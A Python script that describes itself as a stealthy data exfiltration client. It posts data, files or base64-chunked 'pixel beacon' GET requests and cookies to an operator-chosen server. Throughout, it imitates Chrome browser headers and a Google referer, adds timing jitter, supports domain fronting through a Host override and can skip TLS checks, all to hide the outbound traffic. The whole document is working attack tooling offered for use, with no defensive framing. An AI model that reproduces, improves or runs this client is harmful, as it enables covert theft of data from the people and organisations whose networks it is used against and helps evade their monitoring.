#!/usr/bin/env python3
"""
Stealthy data exfiltration client.

Features
- Browser-like headers (Chrome UA, Accept, Language, etc.)
- Optional jitter between requests
- Supports JSON, raw text, or file upload modes
- Bearer token auth via --token or EXFIL_TOKEN env var
- Optional custom exfil path (defaults to /exfil)
- TLS support with --insecure to skip cert validation
- Basic retries with backoff
"""

import argparse
import os
import sys
import time
import json
import base64
import random
from pathlib import Path

import requests


DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "DNT": "1",
}


def jitter_delay(min_ms: int, max_ms: int):
    if max_ms <= 0:
        return 0.0
    d = random.uniform(min_ms, max(min_ms, max_ms)) / 1000.0
    if d > 0:
        time.sleep(d)
    return d


def add_auth(headers: dict, token: str | None):
    if token:
        headers = dict(headers)
        headers["Authorization"] = f"Bearer {token}"
    return headers


def post_json(url: str, payload: dict, headers: dict, verify: bool, retries: int):
    for attempt in range(1, retries + 1):
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10, verify=verify)
            return r
        except requests.RequestException:
            if attempt == retries:
                raise
            time.sleep(0.5 * attempt)


def post_raw(url: str, data: str, headers: dict, verify: bool, retries: int):
    for attempt in range(1, retries + 1):
        try:
            r = requests.post(url, data=data.encode("utf-8"), headers=headers, timeout=10, verify=verify)
            return r
        except requests.RequestException:
            if attempt == retries:
                raise
            time.sleep(0.5 * attempt)


def post_file(url: str, path: Path, headers: dict, verify: bool, retries: int):
    for attempt in range(1, retries + 1):
        try:
            with open(path, "rb") as f:
                files = {"file": (path.name, f, "application/octet-stream")}
                r = requests.post(url, files=files, headers=headers, timeout=20, verify=verify)
                return r
        except requests.RequestException:
            if attempt == retries:
                raise
            time.sleep(0.5 * attempt)


def main():
    p = argparse.ArgumentParser(description="Stealth exfil client")
    p.add_argument("base", help="Base URL, e.g. https://host:8080")
    p.add_argument("mode", choices=["json", "raw", "file", "get", "cookie"], help="Send mode")
    p.add_argument("payload", help="JSON text, raw string, or file path depending on mode")
    p.add_argument("--path", default=os.getenv("EXFIL_PATH", "/exfil"), help="Exfil path (default: /exfil or EXFIL_PATH)")
    p.add_argument("--token", default=os.getenv("EXFIL_TOKEN"), help="Bearer token or EXFIL_TOKEN env")
    p.add_argument("--auth-cookie-name", default="auth", help="Cookie name to carry token (server accepts 'auth' or 'session')")
    p.add_argument("--referer", default="https://www.google.com/", help="Referer header")
    p.add_argument("--host-header", default=None, help="Override Host header (e.g., for domain fronting)")
    p.add_argument("--insecure", action="store_true", help="Skip TLS verification")
    p.add_argument("--min-jitter", type=int, default=int(os.getenv("EXFIL_JITTER_MIN_MS", "0")), help="Min jitter (ms)")
    p.add_argument("--max-jitter", type=int, default=int(os.getenv("EXFIL_JITTER_MAX_MS", "0")), help="Max jitter (ms)")
    p.add_argument("--retries", type=int, default=3, help="Retries on network errors")
    p.add_argument("--get-path", default=os.getenv("EXFIL_GET_PATH", "/pixel.gif"), help="GET exfil path (default: /pixel.gif or EXFIL_GET_PATH)")
    p.add_argument("--get-param", default=os.getenv("EXFIL_GET_PARAM", "q"), help="GET exfil query parameter name (default: q)")
    p.add_argument("--chunk-size", type=int, default=1200, help="Max base64url chunk size for GET beacons (0=disable chunking)")
    p.add_argument("--id", default=None, help="Custom beacon id for chunked GET (uuid if omitted)")
    p.add_argument("--cookie-name", default="c", help="Cookie name for cookie exfil (default: c)")
    args = p.parse_args()

    headers = dict(DEFAULT_HEADERS)
    headers["Referer"] = args.referer
    headers = add_auth(headers, args.token)
    if args.host_header:
        headers["Host"] = args.host_header

    url = args.base.rstrip("/") + args.path
    verify = not args.insecure

    jitter_delay(args.min_jitter, args.max_jitter)

    if args.mode == "json":
        try:
            payload = json.loads(args.payload)
        except json.JSONDecodeError as e:
            print(f"Invalid JSON: {e}", file=sys.stderr)
            return 2
        r = post_json(url, payload, headers, verify, args.retries)
    elif args.mode == "raw":
        r = post_raw(url, args.payload, headers, verify, args.retries)
    elif args.mode == "file":
        path = Path(args.payload)
        if not path.exists():
            print(f"File not found: {path}", file=sys.stderr)
            return 2
        upload_url = args.base.rstrip("/") + "/upload"
        r = post_file(upload_url, path, headers, verify, args.retries)
    elif args.mode == "get":
        # Encode payload and send via query param; supports chunking
        b = args.payload.encode("utf-8")
        qall = base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")
        headers_img = dict(headers)
        headers_img["Accept"] = "image/avif,image/webp,image/apng,image/*,*/*;q=0.8"
        pixel_url = args.base.rstrip("/") + args.get_path
        if args.chunk_size and len(qall) > args.chunk_size:
            import uuid as _uuid
            bid = args.id or _uuid.uuid4().hex
            parts = [qall[i:i+args.chunk_size] for i in range(0, len(qall), args.chunk_size)]
            for i, part in enumerate(parts):
                params = {args.get_param: part, 'id': bid, 'i': i, 'n': len(parts)}
                requests.get(pixel_url, headers=headers_img, params=params, timeout=10, verify=verify)
                jitter_delay(args.min_jitter, args.max_jitter)
            # Final response from last beacon; fetch a pixel without data to conclude
            r = requests.get(pixel_url, headers=headers_img, timeout=10, verify=verify)
        else:
            params = {args.get_param: qall}
            r = requests.get(pixel_url, headers=headers_img, params=params, timeout=10, verify=verify)
    else:
        # cookie mode
        b = args.payload.encode("utf-8")
        cval = base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")
        pixel_url = args.base.rstrip("/") + args.get_path
        headers_ck = dict(headers)
        # Carry token in cookie if present (server accepts 'auth' or 'session')
        cookie_parts = []
        if args.token:
            cookie_parts.append(f"{args.auth_cookie_name}={args.token}")
        # If chunking is enabled and needed, fall back to query-param chunks for data
        if args.chunk_size and len(cval) > args.chunk_size:
            import uuid as _uuid
            bid = args.id or _uuid.uuid4().hex
            parts = [cval[i:i+args.chunk_size] for i in range(0, len(cval), args.chunk_size)]
            headers_ck["Cookie"] = "; ".join(cookie_parts)
            for i, part in enumerate(parts):
                params = {args.get_param: part, 'id': bid, 'i': i, 'n': len(parts)}
                requests.get(pixel_url, headers=headers_ck, params=params, timeout=10, verify=verify)
                jitter_delay(args.min_jitter, args.max_jitter)
            r = requests.get(pixel_url, headers=headers_ck, timeout=10, verify=verify)
        else:
            cookie_parts.append(f"{args.cookie_name}={cval}")
            headers_ck["Cookie"] = "; ".join(cookie_parts)
            headers_ck["Accept"] = "image/avif,image/webp,image/apng,image/*,*/*;q=0.8"
            r = requests.get(pixel_url, headers=headers_ck, timeout=10, verify=verify)
        headers_ck["Cookie"] = "; ".join(cookie_parts)
        headers_ck["Accept"] = "image/avif,image/webp,image/apng,image/*,*/*;q=0.8"
        r = requests.get(pixel_url, headers=headers_ck, timeout=10, verify=verify)

    print(f"Status: {r.status_code}")
    ct = r.headers.get("Content-Type", "")
    if "application/json" in ct and r.text:
        try:
            print(json.dumps(r.json(), indent=2))
        except Exception:
            print(r.text[:500])
    else:
        # Silent responses are 204 with no content
        print(r.text[:500])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
